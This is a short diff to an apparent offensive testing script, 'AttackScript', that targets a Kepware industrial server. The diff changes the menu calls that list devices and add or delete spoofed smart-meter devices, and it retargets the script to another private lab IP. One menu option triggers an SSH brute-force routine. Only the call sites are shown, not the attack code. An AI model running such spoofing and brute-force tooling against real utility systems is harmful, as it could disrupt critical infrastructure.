@@ -1822,13 +1822,13 @@ class AttackScript:
             case "21":
                 self.kep_get_all_channels()
             case "22":
-                self.kep_get_all_devices("Channel1")
+                self.kep_get_all_devices("SmartMeter")
             case "23":
                 self.kep_get_single_device("SmartMeter", "Meter1")
             case "24":
-                self.kep_delete_spoofed_device("Channel1", "Device1")
+                self.kep_delete_spoofed_device("SmartMeter", "Device9999")
             case "25":
-                self.kep_add_spoofed_device("SmartMeter", "Meter1")
+                self.kep_add_spoofed_device("SmartMeter", "Device7589")
             case "26":
                 self.ssh_brute_force()  # Move this up to be with the other ssh functions
             case "27":
@@ -1843,5 +1843,5 @@ class AttackScript:
 
 
 if __name__ == '__main__':
-    attack = AttackScript("172.16.2.77")
+    attack = AttackScript("172.16.2.223")
     attack.main()
